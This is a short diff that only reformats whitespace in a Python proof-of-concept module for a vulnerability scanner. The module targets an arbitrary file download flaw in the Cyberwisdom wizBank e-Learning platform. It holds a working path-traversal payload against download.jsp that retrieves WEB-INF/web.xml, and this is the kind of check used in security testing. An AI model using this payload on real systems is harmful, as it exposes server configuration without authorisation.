@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Cyberwisdom_0001' # 平台漏洞编号，留空
+    vuln_id = 'Cyberwisdom_0001'  # 平台漏洞编号，留空
     name = '汇思e-Learning平台wizBank 任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2016-01-17'  # 漏洞公布时间
     desc = '''
         汇思e-Learning平台wizBank 网站配置不当，导致可以直接下载应用配置信息。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Cyberwisdom(汇思软件)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'beb5ab0d-fc64-498a-a4fb-237c98993cfd'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = "/cw/skin1/jsp/download.jsp?file=/WEB-INF/web.xml"
             verify_url = self.target + payload
             req = requests.get(verify_url)
@@ -44,6 +46,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
